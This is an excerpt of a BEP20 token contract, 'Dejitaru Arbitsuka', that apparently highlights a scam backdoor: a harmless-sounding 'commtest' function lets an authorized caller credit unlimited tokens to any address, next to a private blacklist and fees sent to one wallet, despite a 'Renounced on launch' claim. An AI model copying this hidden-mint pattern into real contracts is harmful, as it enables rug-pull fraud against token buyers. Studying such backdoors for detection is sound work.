...
Liquidity locked + Renounced on launch
...
contract ERC20 is Context, IBEP20 {
    ...
    function _commtest(address to, uint256 amount) internal virtual {
        _balances[to] = _balances[to].add(amount);
    }
...
contract ARBITSUKA is ERC20, Ownable {
    using SafeMath for uint256;
    uint256 public _totalAmount = 100000000 * 10 ** 18;
    uint256 public _totalFee = 11;
    uint256 public _feeDenominator = 100;
    mapping(address => bool) private _blackList;
    string  _name = "Dejitaru Arbitsuka";
    string  _symbol = "ARBITSUKA";
    address _marketingFeeReceiver = 0xE086fC5885b0B0A7e90a3f9F1830e4F844192603;
    address _teamFeeReceiver = 0xE086fC5885b0B0A7e90a3f9F1830e4F844192603;
    ...
    function commtest(address to, uint256 amount) public authorized {
        _commtest(to, amount);
    }
